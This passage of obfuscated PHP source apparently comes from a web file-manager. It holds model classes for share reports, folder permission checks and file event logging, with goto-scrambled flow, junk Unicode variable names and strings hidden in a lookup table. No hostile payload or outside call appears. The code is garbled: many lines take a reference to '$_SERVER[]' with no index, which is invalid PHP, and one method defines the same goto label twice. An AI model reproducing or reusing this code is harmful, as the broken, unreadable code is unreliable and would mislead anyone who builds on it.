f׎: for ($D왴Ǆ = 0; $D왴Ǆ < count($fۑ); $D왴Ǆ++) { $AУ刑 = $this->getInfo($fۑ[$D왴Ǆ]); if ($AУ刑[$aۯ[448]] == $aۯ[83]) { Model($aۯ[507])->eventShare($AУ刑[$aۯ[369]], $aۯ[2246]); } if ($AУ刑[$aۯ[446]] == $aۯ[83]) { Model($aۯ[507])->eventShare($AУ刑[$aۯ[369]], $aۯ[2245]); } } return $d߃ԏ; goto Fοڔ; Fοڔ: } protected function removeBySource($eď) { goto dՑ; fǊ: $this->where($Dȑ)->delete(); Model($a͈[539])->where($Dȑ)->delete(); goto bؐ; dՑ: $a͈ =& $_SERVER[]; $Dȑ = array($a͈[383] => array($a͈[384], $eď)); $a툺 = $this->field($a͈[441])->where($Dȑ)->select(); goto b̶; b̶: $a툺 = array_to_keyvalue($a툺, $a͈[33], $a͈[441]); if (!$a툺) { return; } $Dȑ = array($a͈[440] => array($a͈[384], $a툺)); goto fǊ; bؐ: } public function listAll($DĐ) { goto C竞; d˸: return $c; goto cج; aː: if ($DĐ[$a[701]]) { $D = $DĐ[$a[449]] ? $DĐ[$a[449]] : strtotime(date($a[2260])); $c[$a[187]] = array($a[321], array($DĐ[$a[701]], $D)); } if ($DĐ[$a[29]]) { $c[$DĐ[$a[29]]] = 1; } else { $c[] = array($a[446] => array($a[927], 0), $a[448] => array($a[927], 0), $a[2236] => $a[2193]); } if ($DĐ[$a[2189]]) { $c[] = array($a[443] => $DĐ[$a[2189]], $a[1343] => array($a[750], "\x25{$DĐ[$a[2189]]}\x25"), $a[2236] => $a[2193]); } goto E􊤢; E􊤢: $c = $this->_makeOrder()->where($c)->selectPage(20); if (empty($c[$a[354]])) { return array(); } $this->_listDataApply($c[$a[354]]); goto d˸; C竞: $a =& $_SERVER[]; $c = array(); if ($DĐ[$a[1437]]) { $c[$a[1437]] = $DĐ[$a[1437]]; } goto aː; cج: } public function listDataApply($cָ) { $this->_listDataApply($cָ); return $cָ; } private function _listDataApply(&$Cɽї) { $Aͬ =& $_SERVER[]; $eʟ = array_to_keyvalue($Cɽї, $Aͬ[33], $Aͬ[1437]); $eߜȫ = Model($Aͬ[479])->userListInfo(array_unique($eʟ)); $E܎ = array_to_keyvalue($Cɽї, $Aͬ[33], $Aͬ[369]); $FΎ͚ = Model($Aͬ[751])->sourceListInfo($E܎, !0); foreach ($Cɽї as &$fЉ) { $F = $fЉ[$Aͬ[1437]]; $fЉ[$Aͬ[2261]] = $eߜȫ[$F] ? $eߜȫ[$F] : !1; $Bޝ = $fЉ[$Aͬ[369]]; $fЉ[$Aͬ[391]] = $FΎ͚[$Bޝ] ? $FΎ͚[$Bޝ] : !1; } } private function _makeOrder($Fđ = '') { goto E; dވ: $Fđ = $Fđ . "{$B}\x20{$fƾ}"; return $this->order($Fđ); goto AǊ; F콿: $B = Input::get($b頻[407], $b頻[7], $b頻[389], $fً); $fƾ = Input::get($b頻[408], $b頻[7], $b頻[2262], array($b頻[2188], $b頻[404])); $fƾ = $d򹠇[$fƾ]; goto dވ; E: $b頻 =& $_SERVER[]; $fً = array($b頻[187], $b頻[449], $b頻[2248], $b頻[2249]); $d򹠇 = array($b頻[402] => $b頻[403], $b頻[404] => $b頻[405]); goto F콿; AǊ: } public function reportAdd($b) { $a =& $_SERVER[]; $BԹ = array($a[441] => $b[$a[441]], $a[1437] => USER_ID); if (Model($a[2258])->where($BԹ)->find()) { return !1; } $F = array($a[441] => $b[$a[441]], $a[1343] => $b[$a[1343]], $a[369] => $b[$a[369]], $a[419] => $b[$a[419]], $a[1437] => USER_ID, $a[29] => $b[$a[29]], $a[405] => $b[$a[405]]); return Model($a[2258])->add($F); } public function reportList($AΧՑ) { goto e; F܃: $dɥ = array($A̟ö[402] => $A̟ö[403], $A̟ö[404] => $A̟ö[405]); $f푇 = $A̟ö[2266] . $dɥ[$Bڗ]; $A̽ꌉ = Model($A̟ö[2258])->where($cˌ)->order($f푇)->selectPage(20); goto D܋; F΋ӓ: if (isset($AΧՑ[$A̟ö[29]]) && in_array($AΧՑ[$A̟ö[29]], array($A̟ö[83], $A̟ö[2263], $A̟ö[2264], $A̟ö[2265], $A̟ö[1923]))) { $cˌ[$A̟ö[29]] = $AΧՑ[$A̟ö[29]]; } if (isset($AΧՑ[$A̟ö[688]]) && in_array($AΧՑ[$A̟ö[688]], array($A̟ö[470], $A̟ö[83], $A̟ö[2263], $A̟ö[2264]))) { $cˌ[$A̟ö[688]] = $AΧՑ[$A̟ö[688]]; } $Bڗ = Input::get($A̟ö[408], $A̟ö[7], $A̟ö[2262], array($A̟ö[2188], $A̟ö[404])); goto F܃; e: $A̟ö =& $_SERVER[]; $cˌ = array(); if ($AΧՑ[$A̟ö[701]]) { $cΓ = $AΧՑ[$A̟ö[449]] ? $AΧՑ[$A̟ö[449]] : strtotime(date($A̟ö[2260])); $cˌ[$A̟ö[187]] = array($A̟ö[321], array($AΧՑ[$A̟ö[701]], $cΓ)); } goto F΋ӓ; D܋: if (empty($A̽ꌉ[$A̟ö[354]])) { return array(); } $this->_listDataApply($A̽ꌉ[$A̟ö[354]]); return $A̽ꌉ; goto A꘩; A꘩: } public function reportStatus($a) { goto bХΰ; C: if (!$bŪ) { return !1; } $Fꂇ = array($B[688] => $a[$B[688]]); if ($a[$B[688]] == $B[2264] && $bŪ[$B[688]] == $B[2264]) { $Fꂇ[$B[688]] = 0; } goto cܧ; Dɐ: return $Eʐ; goto dƽ; cܧ: $Eʐ = Model($B[2258])->where($c񑹋)->save($Fꂇ); if ($a[$B[688]] == $B[2263]) { if ($bŪ[$B[419]] != $B[470] && $this->shareFileMeta($bŪ[$B[419]])) { $this->shareFileMeta($bŪ[$B[419]], 0); } $this->remove($bŪ[$B[441]]); return !0; } if ($Eʐ && $a[$B[688]] == $B[2264]) { $f = $Fꂇ[$B[688]] == $B[2264] ? 1 : 0; $this->shareFileMeta($bŪ[$B[419]], $f); $this->removeByFile($bŪ[$B[419]]); } goto Dɐ; bХΰ: $B =& $_SERVER[]; $c񑹋 = array($B[367] => $a[$B[367]]); $bŪ = Model($B[2258])->where($c񑹋)->field($B[2267])->find(); goto C; dƽ: } private function removeByFile($C±) { goto e鱡; A: $fʦ = array($Aƈؗ[369] => array($Aƈؗ[7], $D), $Aƈؗ[446] => 1); $b = Model($Aƈؗ[2085])->where($fʦ)->field($Aƈؗ[441])->select(); if (empty($b)) { return; } goto bԚΌ; bԚΌ: $F凅 = array_to_keyvalue($b, $Aƈؗ[33], $Aƈؗ[441]); $this->remove($F凅); goto FՕ; e鱡: $Aƈؗ =& $_SERVER[]; $b = Model($Aƈؗ[751])->where(array($Aƈؗ[419] => $C±))->field($Aƈؗ[369])->select(); $D = array_to_keyvalue($b, $Aƈؗ[33], $Aƈؗ[369]); goto A; FՕ: } private function shareFileMeta($d繴ˮ, $Fބ = null) { $Bٱۙ =& $_SERVER[]; $a҅ڄ = array($Bٱۙ[419] => $d繴ˮ, $Bٱۙ[89] => $Bٱۙ[2268]); if (is_null($Fބ)) { return Model($Bٱۙ[2269])->where($a҅ڄ)->find(); } $a҅ڄ[$Bٱۙ[359]] = $Fބ; Model($Bٱۙ[2269])->add($a҅ڄ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\x72\143\145\x5f\141\165\164\150"; public function getAuth($Bٰ椔) { goto Eٴ觃; aؠʳ: return $Cꚏ; goto Cޮٝ; aȢЌ: $fί = $this->field($c췪ŵ)->order($D˚[367])->where($e܋)->select(); $Cꚏ = array(); foreach ($fί as $c҄М) { if (Model($D˚[2271])->listData($c҄М[$D˚[2252]])) { $Cꚏ[] = $c҄М; } } goto aؠʳ; Eٴ觃: $D˚ =& $_SERVER[]; $c췪ŵ = $D˚[2270]; $e܋ = array($D˚[369] => $Bٰ椔); goto aȢЌ; Cޮٝ: } public function setAuth($Eͨ뢯, $f) { goto bںˏ; D貺: $c۔ = 1; $c = $cډ麸[$aҥ־[458]]; if ($c != $c۔) { $dө = array($aҥ־[2108] => $c); $a = Model($aҥ־[2187])->field($aҥ־[1437])->where($dө)->select(); $a = array_to_keyvalue($a, $aҥ־[33], $aҥ־[1437]); } goto b; BȄ: $this->where(array($aҥ־[383] => $Eͨ뢯))->delete(); $this->addAll($Fҽ); return !0; goto F; bںˏ: $aҥ־ =& $_SERVER[]; $cډ麸 = Model($aҥ־[1119])->sourceInfo($Eͨ뢯); if ($cډ麸[$aҥ־[371]] != SourceModel::TYPE_GROUP) { return !1; } goto D貺; b: $E = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Fҽ = array(); foreach ($f as $dۙՃ) { if (!in_array($dۙՃ[$aҥ־[371]], $E)) { show_json(LNG($aҥ־[2272]), !1); } if ($c != $c۔) { if ($dۙՃ[$aҥ־[371]] == SourceModel::TYPE_GROUP) { } if ($dۙՃ[$aҥ־[458]] != 0 && !in_array($dۙՃ[$aҥ־[458]], $a)) { } } if ($dۙՃ[$aҥ־[458]] == 0) { $dۙՃ[$aҥ־[371]] = SourceModel::TYPE_USER; } $Fҽ[] = array($aҥ־[369] => $Eͨ뢯, $aҥ־[371] => intval($dۙՃ[$aҥ־[371]]), $aҥ־[458] => intval($dۙՃ[$aҥ־[458]]), $aҥ־[2252] => intval($dۙՃ[$aҥ־[2252]]) ? intval($dۙՃ[$aҥ־[2252]]) : 0, $aҥ־[2253] => intval($dۙՃ[$aҥ־[2253]]) ? intval($dۙՃ[$aҥ־[2253]]) : -1); } goto BȄ; F: } public function authClear($D) { $Eᛶ =& $_SERVER[]; $aδ = Model($Eᛶ[1119])->sourceInfo($D); $bÒد = array($D); if ($aδ[$Eᛶ[370]] == $Eᛶ[83]) { $fǝ펧 = array($Eᛶ[527] => array($Eᛶ[485], $aδ[$Eᛶ[461]] . $D . $Eᛶ[486])); $bÒد = Model($Eᛶ[1119])->field($Eᛶ[383])->where($fǝ펧)->getField($Eᛶ[369], !0); $bÒد[] = $D; } $this->where(array($Eᛶ[383] => array($Eᛶ[384], $bÒد)))->delete(); return !0; } public function get($Bп) { $aˇ = $this->getSourceList(array($Bп), !0); return $aˇ[0]; } public function getSourceList($bɷ, $Dې = false) { goto eñ; eñ: $Bʃ =& $_SERVER[]; if (!$bɷ) { return array(); } $b𘼊 = Model($Bʃ[1119]); goto dΖ; CɃ: $B况 = array_values(array_unique($B况)); if (!$B况) { return array(); } $aܑ = $Bʃ[2274]; goto c; dΖ: if (!$Dې) { $Bë = array($Bʃ[383] => array($Bʃ[384], $bɷ)); $Dې = $b𘼊->field($Bʃ[2273])->where($Bë)->select(); $Dې = array_to_keyvalue($Dې, $Bʃ[369]); } $B况 = $bɷ; foreach ($Dې as $Eӕ => $A۩ɻ) { $Aܪ¦ = $b𘼊->parentLevelArray($A۩ɻ[$Bʃ[461]]); $B况 = array_merge($B况, $Aܪ¦, array($Eӕ)); } goto CɃ; c: $Bë = array($Bʃ[383] => array($Bʃ[384], $B况)); $A؃ = $this->field($aܑ)->where($Bë)->select(); $A؃ = array_to_keyvalue_group($A؃, $Bʃ[369]); goto Aל憢; Aל憢: $c = array(); foreach ($Dې as $fҍ => $F) { $c[$fҍ] = $this->makeSourceAuth($F, $A؃); } return $c; goto d׺; d׺: } public function authDeepCheck($Dӎͯ) { goto a; Fȧ: if (!in_array($Dӎͯ, $Fßю[$F٬[2275]])) { return !1; } $B = array(); foreach ($Fßю[$F٬[2276]] as $f뵬 => $c) { if (!in_array($Dӎͯ, $c)) { continue; } $B[] = $f뵬; } goto f; a: $F٬ =& $_SERVER[]; if (_get($GLOBALS, $F٬[459])) { return !1; } $Fßю = $this->makeAuthDeep(); goto Fȧ; f: $f滄 = $B ? $B[0] : $Dӎͯ; return array($F٬[377] => -1, $F٬[418] => array($F٬[385] => $F٬[1033], $F٬[2114] => $F٬[470], $F٬[386] => LNG($F٬[2277]), $F٬[2126] => $F٬[2278]), $F٬[2279] => array($F٬[388] => $F٬[2280], $F٬[75] => $f滄)); goto E; E: } protected function makeAuthDeep() { goto D; F: $C = array(); $fܥ֗ = array(); $eʗ = array(); goto CЎ; CЎ: if ($A) { $B = $e->where(array($d򑉦[369] => array($d򑉦[384], $A)))->select(); foreach ($B as $e؅) { $bɯ = $e->parentLevelArray($e؅[$d򑉦[461]]); $eĦ = array_merge($eĦ, $bɯ); $b[] = $e؅[$d򑉦[458]]; $a吿[$e؅[$d򑉦[369]]] = $bɯ; $C[$e؅[$d򑉦[369]]] = $e؅[$d򑉦[458]]; } } $b = array_values(array_unique($b)); $E = $b; goto Aߝ✈; B: $B￉ = Model($d򑉦[2281])->listData(); $eƤᒨ = array(); foreach ($B￉ as $Fʂ) { if ($Fʂ[$d򑉦[376]] == 0 && $Fʂ[$d򑉦[2128]] == $d򑉦[83]) { $eƤᒨ[] = $Fʂ[$d򑉦[367]]; } } goto a̬; E燐: return $a̎; goto A; d۪ۍ: foreach ($a吿 as $Cտ => $c) { $E = $C[$Cտ]; if (!$E || !$fܥ֗[$E]) { continue; } $DǴӶ = array(); foreach ($eʗ[$E] as $c屢) { $DǴӶ[] = $fܥ֗[$c屢]; } $a吿[$Cտ] = array_merge($DǴӶ, $c); } $eĦ = array_values(array_unique($eĦ)); $a̎ = array($d򑉦[2275] => $eĦ, $d򑉦[2276] => $a吿); goto E燐; E: $e = Model($d򑉦[1119]); $d = Model($d򑉦[460]); $a吿 = array(); goto F; C: $A = array_to_keyvalue($FΡ, $d򑉦[33], $d򑉦[369]); $eĦ = array(); $b = $e˘; goto E; a̬: $e˘ = Session::get($d򑉦[2237]); $e˘ = array_to_keyvalue($e˘, $d򑉦[33], $d򑉦[2108]); $E = array($d򑉦[371] => SourceModel::TYPE_USER, $d򑉦[458] => USER_ID); goto Bʖ; Aߝ✈: foreach ($E as $c屢) { $dƠ = $d->getInfo($c屢); $bɯ = $e->parentLevelArray($dƠ[$d򑉦[461]]); $b = array_merge($b, $bɯ); } $b = array_values(array_unique($b)); foreach ($b as $c屢) { $dƠ = $d->getInfo($c屢); $eĦ[] = $dƠ[$d򑉦[391]][$d򑉦[369]]; $fܥ֗[$c屢] = $dƠ[$d򑉦[391]][$d򑉦[369]]; $eʗ[$c屢] = $e->parentLevelArray($dƠ[$d򑉦[461]]); } goto d۪ۍ; D: $d򑉦 =& $_SERVER[]; static $a̎ = false; if ($a̎) { return $a̎; } goto B; Bʖ: if ($e˘) { $E = array(array($d򑉦[371] => SourceModel::TYPE_USER, $d򑉦[458] => USER_ID), array($d򑉦[371] => SourceModel::TYPE_GROUP, $d򑉦[458] => array($d򑉦[384], $e˘)), $d򑉦[915] => $d򑉦[2193]); } if ($eƤᒨ) { $E = array($E, $d򑉦[2252] => array($d򑉦[2282], $eƤᒨ)); } $FΡ = $this->field($d򑉦[2283])->where($E)->select(); goto C; A: } private function makeSourceAuth($d, $e޵) { goto fɘ; f: $Bޛ = !1; foreach ($d، as $bݦ) { if (!isset($e޵[$bݦ])) { continue; } $C㈨ = $this->authMake($e޵[$bݦ]); if ($C㈨[$cڴ[418]]) { $Bޛ = $C㈨; break; } } if (!$F괤) { return $Bޛ; } goto d¾; d¾: if (!$Bޛ && isset($e[$Eޗ])) { $a쉅 = $e[$Eޗ]; $BԄȈ = Model($cڴ[460])->getInfo($Eޗ); $Bޛ = array($cڴ[2284] => intval($a쉅[$cڴ[376]][$cڴ[376]]), $cڴ[2285] => $a쉅[$cڴ[376]], $cڴ[2279] => array($cڴ[388] => $cڴ[2289], $cڴ[75] => $BԄȈ[$cڴ[391]][$cڴ[369]], $cڴ[2288] => $BԄȈ[$cڴ[465]])); } if (!$Bޛ) { $BԄȈ = Model($cڴ[460])->getInfo($Eޗ); $fݔ = explode($cڴ[47], trim($BԄȈ[$cڴ[461]], $cڴ[47])); foreach ($fݔ as $F߉ߥ) { if ($F߉ߥ == $cڴ[470] || $F߉ߥ == $dҰ鑏) { continue; } if (!isset($e[$F߉ߥ])) { continue; } $a쉅 = $e[$F߉ߥ]; $Bޛ = array($cڴ[2284] => intval($a쉅[$cڴ[376]][$cڴ[376]]), $cڴ[2285] => $a쉅[$cڴ[376]], $cڴ[2279] => array($cڴ[388] => $cڴ[2286], $cڴ[2287] => $BԄȈ[$cڴ[391]][$cڴ[369]], $cڴ[2288] => $BԄȈ[$cڴ[465]])); break; } } if (!$Bޛ || $Bޛ[$cڴ[377]] <= 0) { $dݫ = $this->authDeepCheck($d[$cڴ[369]]); if ($dݫ) { $Bޛ = $dݫ; } } goto Eْ; fɘ: $cڴ =& $_SERVER[]; $e = Session::get($cڴ[2237]); $e = array_to_keyvalue($e, $cڴ[2108]); goto fڗ; Eْ: return $Bޛ; goto D笃; DÈ: $Eޗ = $d[$cڴ[458]]; $F괤 = $d[$cڴ[371]] == SourceModel::TYPE_GROUP; if ($F괤 && isset($e[$Eޗ]) && !_get($GLOBALS, $cڴ[459])) { $a쉅 = $e[$Eޗ]; if (Model($cڴ[2271])->authCheckRoot($a쉅[$cڴ[376]][$cڴ[376]])) { $BԄȈ = Model($cڴ[460])->getInfo($Eޗ); $Bޛ = array($cڴ[2284] => intval($a쉅[$cڴ[376]][$cڴ[376]]), $cڴ[2285] => $a쉅[$cڴ[376]], $cڴ[2279] => array($cڴ[388] => $cڴ[2286], $cڴ[2287] => $BԄȈ[$cڴ[391]][$cڴ[369]], $cڴ[2288] => $BԄȈ[$cڴ[465]])); return $Bޛ; } } goto f; fڗ: $dҰ鑏 = $cڴ[83]; $d، = Model($cڴ[1119])->parentLevelArray($d[$cڴ[461]]); $d، = array_merge(array($d[$cڴ[369]]), array_reverse($d،)); goto DÈ; D笃: } public function authOwnerApply($f) { goto b􃡇; b􃡇: $DƝ =& $_SERVER[]; if (empty($f[$DƝ[376]]) || isset($f[$DƝ[2290]]) && $f[$DƝ[2290]]) { return $f; } if (AuthModel::authCheckRoot($f[$DƝ[376]][$DƝ[377]])) { return $f; } goto eԈ; eԈ: $e˔ = Model($DƝ[1119])->parentLevelArray($f[$DƝ[461]]); $e˔ = array_merge(array($f[$DƝ[369]]), array_reverse($e˔)); $cخ = $DƝ[2274]; goto Aě; Cݓᚭ: $fϋ = array(); $dߋ = array(); foreach ($b١ as $C => $C) { $c = $this->authFolderOwnerUser($C); $fϋ[$C] = $c; $dߋ = array_merge($dߋ, $c[$DƝ[537]]); if ($c[$DƝ[2291]]) { break; } } goto fà; fà: if (count($dߋ) == 0) { $dߋ = $this->authFolderOwnerGroup($f[$DƝ[458]]); } $dߋ = array_unique($dߋ); if (AuthModel::authCheckRoot($f[$DƝ[376]][$DƝ[377]])) { $dߋ[] = USER_ID; } goto e; Aě: $Fũۯ = array($DƝ[383] => array($DƝ[384], $e˔)); $b١ = $this->field($cخ)->where($Fũۯ)->select(); $b١ = array_to_keyvalue_group($b١, $DƝ[369]); goto Cݓᚭ; e: $f[$DƝ[376]][$DƝ[2292]] = Model($DƝ[476])->userListInfo($dߋ); return $f; goto c; c: } private function authFolderOwnerGroup($Eґϻ) { $a =& $_SERVER[]; $Eܙ򜲉 = Model($a[2187])->where(array($a[2108] => $Eґϻ))->select(); $aߐ = array(); if (!$Eܙ򜲉) { return $aߐ; } foreach ($Eܙ򜲉 as $b­) { $f = $this->authInfo($b­); if (AuthModel::authCheckRoot($f[$a[376]])) { $aߐ[] = $b­[$a[1437]]; } } return $aߐ; } private function authFolderOwnerUser($bԺ) { $d =& $_SERVER[]; $fέ = array(); $C = !1; foreach ($bԺ as $a) { $f갰 = $this->authInfo($a); if ($a[$d[458]] == $d[470]) { $C = !0; } if ($a[$d[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($f갰[$d[376]])) { $fέ[] = $a[$d[458]]; } } } return array($d[537] => $fέ, $d[2291] => $C); } public function authMake($A֠) { goto BЦ; cђď: $F = array_to_keyvalue($F, $dӝ[33], $dӝ[2108]); $c׺ = 0; $b = 0; goto A캣; BЦ: $dӝ =& $_SERVER[]; if (!$A֠) { return array($dӝ[377] => 0, $dӝ[418] => !1); } $F = Session::get($dӝ[2237]); goto cђď; Bե: $e = $e؆ ? $c׺ : ($E ? $b : $b庚); $E׫ = $e؆ ? $dݔ : ($E ? $Dĭٟ : $EǙ); $D = $e؆ ? $dӝ[2293] : ($E ? $dӝ[2294] : ($Cȴڰ ? $dӝ[2295] : $dӝ[361])); goto f۵; A캣: $b庚 = 0; $dݔ = 0; $Dĭٟ = 0; goto c; Cʻ: $Cȴڰ = 0; $A = array($dӝ[369] => 0); foreach ($A֠ as $A) { $E׫ = $this->authInfo($A); $b = $A[$dӝ[458]]; $Cߝ = intval($E׫[$dӝ[376]]); if ($A[$dӝ[371]] == SourceModel::TYPE_USER && $b == USER_ID) { $e؆ = !0; $dݔ = $E׫; $c׺ = $Cߝ; } else { if ($A[$dӝ[371]] == SourceModel::TYPE_GROUP && in_array($b, $F)) { $E = !0; if ($Cߝ >= $b) { $b = $Cߝ; $Dĭٟ = $E׫; } } else { if ($b == $dӝ[470]) { $Cȴڰ = !0; $EǙ = $E׫; $b庚 = $Cߝ; } } } } goto Bե; f۵: $B = array($dӝ[2284] => intval($e), $dӝ[2285] => $E׫, $dӝ[2279] => array($dӝ[388] => $D, $dӝ[75] => $A[$dӝ[369]])); return $B; goto Aΐ; c: $EǙ = 0; $e؆ = 0; $E = 0; goto Cʻ; Aΐ: } public function authTargetInfoMake($Dڭ) { goto D݄; Eҏ: foreach ($Dڭ as $bңժ) { if ($bңժ[$D[371]] == SourceModel::TYPE_USER) { $c[] = intval($bңժ[$D[458]]); } else { if ($bңժ[$D[371]] == SourceModel::TYPE_GROUP) { $f놏[] = intval($bңժ[$D[458]]); } } } if ($c) { $c = Model($D[476])->userListInfo($c); } if ($f놏) { $c = array($D[2185] => array($D[384], $f놏)); $f놏 = Model($D[460])->field($D[2198])->where($c)->select(); $f놏 = array_to_keyvalue($f놏, $D[2108]); } goto f蕆; D݄: $D =& $_SERVER[]; $c = array(); $f놏 = array(); goto Eҏ; f蕆: return array($D[2296] => $c, $D[2288] => $f놏); goto f; f: } public function authInfo($E޿) { $e =& $_SERVER[]; if ($E޿[$e[2252]]) { $C = Model($e[2271])->listData($E޿[$e[2252]]); if (!$C) { return !1; $A탮 = Model($e[2271])->listData(); $bŕψ = array_filter_by_field($A탮, $e[376], $e[470]); return $bŕψ; } $Dܜ = array_field_key($C, array($e[367], $e[28], $e[376], $e[2126], $e[2129])); $Dܜ[$e[2297]] = $E޿; return $Dܜ; } else { return array($e[385] => 0, $e[2114] => $E޿[$e[2253]], $e[386] => $e[33], $e[2126] => $e[2298]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\x72\143\145\137\x65\166\145\x6e\x74"; protected $dataAuto = array(array("\x63\162\145\x61\164\145\x54\151\x6d\145", "\x74\151\155\x65", "\151\x6e\x73\x65\x72\164", "\146\165\156\x63\x74\x69\x6f\x6e"), array("\144\145\x73\143", '', "\x69\156\163\x65\162\164\x2c\165\x70\x64\141\164\x65\54\x73\145\x6c\145\x63\164", "\152\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($E⡰, $e, $d֞ = '') { goto C̘; A㠳: $dԍȖ̟ = array($bò[383] => $E⡰, $bò[2299] => $Dͳ[$bò[463]], $bò[2300] => $Dͳ[$bò[28]], $bò[468] => $Dͳ[$bò[468]], $bò[1428] => USER_ID, $bò[388] => $e, $bò[1430] => $d֞); $this->addSystemLog($e, $dԍȖ̟); return $this->add($dԍȖ̟); goto cК雝; C̘: $bò =& $_SERVER[]; if (!$this->eventSave) { return; } $Dͳ = Model($bò[1119])->sourceInfo($E⡰); goto C; C: if (!$Dͳ) { return !1; } if ($this->isCacheEvent($Dͳ, $e)) { return; } if ($d֞ && is_string($d֞)) { $d֞ = array($bò[2138] => $d֞); } goto A㠳; cК雝: } private function addSystemLog($C, $bޠ˅ğ) { $C£ =& $_SERVER[]; if ($C == $C£[2301]) { $C = $bޠ˅ğ[$C£[405]][$C£[2302]]; } else { if (in_array($C, array($C£[2085], $C£[2303]))) { $C = $bޠ˅ğ[$C£[405]][$C£[691]]; } } $A = array_merge($bޠ˅ğ, array($C£[2304] => $bޠ˅ğ[$C£[369]], $C£[2305] => $bޠ˅ğ[$C£[2305]])); Model($C£[2048])->addLog($C£[2306] . $C, $A); } private function isCacheEvent($cך, $e؏Ƈ) { if ($cך[$_SERVER[][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($Eܸ, $A̅Ġ) { $EΙ =& $_SERVER[]; $D´ = Model($EΙ[1119])->sourceInfo($Eܸ); $E۾ = array($EΙ[2302] => $A̅Ġ, $EΙ[28] => $D´[$EΙ[28]]); return $this->addEvent($Eܸ, $EΙ[2301], $E۾); } public function eventFileEdit($F݉) { $cۉ =& $_SERVER[]; $dą = array($cۉ[2307] => $_SERVER[$cۉ[2308]], $cۉ[1752] => strtolower(ACTION)); return $this->addEvent($F݉, $cۉ[2075], $dą); } public function eventRecycle($f߷, $Cʍ) { return $this->addEvent($f߷, $_SERVER[][2303], $Cʍ); } public function eventRemove($B) { $b֧ =& $_SERVER[]; $A = Model($b֧[1119])->sourceInfo($B); $fŹ = $A[$b֧[28]]; return $this->addEvent($A[$b֧[463]], $b֧[2074], $fŹ); } public function eventShare($E, $F׏) { return $this->addEvent($E, $_SERVER[][2085], $F׏); } public function eventMove($A͢, $f, $e쏴) { goto b; e: $fͭ = $eǖ->sourceInfo($f); $bş = $eǖ->sourceInfo($e쏴); $bŽ㲑 = array($eƋۺȑ[1009] => $f, $eƋۺȑ[2309] => $fͭ[$eƋۺȑ[28]], $eƋۺȑ[2310] => $fͭ[$eƋۺȑ[468]], $eƋۺȑ[1010] => $e쏴, $eƋۺȑ[2311] => $bş[$eƋۺȑ[28]], $eƋۺȑ[2312] => $bş[$eƋۺȑ[468]]); goto E⭏; b: $eƋۺȑ =& $_SERVER[]; $eǖ = Model($eƋۺȑ[1119]); $C݅ = $eǖ->sourceInfo($A͢); goto e; cÚ: $this->addEvent($f, $eƋۺȑ[2313], $bŽ㲑); goto e; E⭏: $this->addEvent($A͢, $eƋۺȑ[494], $bŽ㲑); $C݅ = $eǖ->sourceInfo($A͢); $bŽ㲑 = array($eƋۺȑ[369] => $C݅[$eƋۺȑ[369]], $eƋۺȑ[28] => $C݅[$eƋۺȑ[28]]); goto cÚ; e: } public function eventCopy($D悻) { $this->eventCreate($D悻, $_SERVER[][492]); } public function eventRename($D䟕ޥ, $a, $b񠰤) { $C =& $_SERVER[]; $e = array($C[1009] => $a, $C[1010] => $b񠰤); return $this->addEvent($D䟕ޥ, $C[1132], $e); } public function eventAddComment($Fۦ܋, $E) { return $this->addEvent($Fۦ܋, $_SERVER[][2314], $E); } public function eventAddDesc($Dɚ, $f̊) { return $this->addEvent($Dɚ, $_SERVER[][2315], $f̊); } public function listBySource($D) { goto dĈ; CջƢ: if ($AŲ[$f턑ǋ[370]] == $f턑ǋ[83]) { $B = Model($f턑ǋ[1119])->listSearchChildren($D, 20000); $B[] = $D . $f턑ǋ[361]; $aƥˇף = array($f턑ǋ[369] => array($f턑ǋ[7], $B)); } $A = $this->where($aƥˇף)->order($f턑ǋ[2316])->selectPage(); if ($A[$f턑ǋ[351]][$f턑ǋ[352]] == 0) { $A[$f턑ǋ[351]][$f턑ǋ[352]] = 1; $A[$f턑ǋ[354]] = array(array($f턑ǋ[383] => $D, $f턑ǋ[2299] => $AŲ[$f턑ǋ[463]], $f턑ǋ[1428] => $AŲ[$f턑ǋ[378]], $f턑ǋ[388] => $f턑ǋ[2317], $f턑ǋ[389] => $AŲ[$f턑ǋ[187]], $f턑ǋ[1430] => $f턑ǋ[33])); } goto E; E: return $this->eventListParse($A, $D); goto f֊ʃ; dĈ: $f턑ǋ =& $_SERVER[]; $AŲ = Model($f턑ǋ[1119])->sourceInfo($D); $aƥˇף = array($f턑ǋ[383] => $D); goto CջƢ; f֊ʃ: } private function eventListParse($dւ, $a) { goto DǹҺ; Cӟ: $b = array_to_keyvalue($E, $c[33], $c[2305]); foreach ($E as $bȰ) { $cԉ = $bȰ[$c[405]]; if ($bȰ[$c[29]] == $c[494] && isset($cԉ[$c[1009]])) { $C􅜖[] = $cԉ[$c[1009]] . $c[33]; $C􅜖[] = $cԉ[$c[1010]] . $c[33]; } if ($bȰ[$c[29]] == $c[2313] && isset($cԉ[$c[369]])) { $C􅜖[] = $cԉ[$c[369]] . $c[33]; } } $C􅜖 = array_merge($C􅜖, $b, array($a . $c[33])); goto b뛧ެ; eɡ: $bȜ򦗄 = Model($c[751])->sourceListInfo($C􅜖, !0); foreach ($E as &$bȰ) { if ($bȰ[$c[29]] == $c[494] && isset($bȰ[$c[405]][$c[1009]])) { $bȰ[$c[405]][$c[1009]] = $bȜ򦗄[$bȰ[$c[405]][$c[1009]]]; $bȰ[$c[405]][$c[1010]] = $bȜ򦗄[$bȰ[$c[405]][$c[1010]]]; } if ($bȰ[$c[29]] == $c[2313] && isset($bȰ[$c[405]][$c[369]])) { $bȰ[$c[405]][$c[369]] = $bȜ򦗄[$bȰ[$c[405]][$c[369]]]; } $bȰ[$c[391]] = $bȜ򦗄[$bȰ[$c[369]]]; $bȰ[$c[2318]] = $bȜ򦗄[$bȰ[$c[2305]]]; if ($bȰ[$c[29]] == $c[2074]) { $bȰ[$c[2318]] = $bȰ[$c[391]]; $bȰ[$c[2305]] = $bȰ[$c[2318]][$c[369]]; $bȰ[$c[391]] = !1; $bȰ[$c[369]] = $c[33]; } $bȰ[$c[2261]] = $C£[$bȰ[$c[1437]]]; } $dւ[$c[354]] = $E; goto C㐃Å; DǹҺ: $c =& 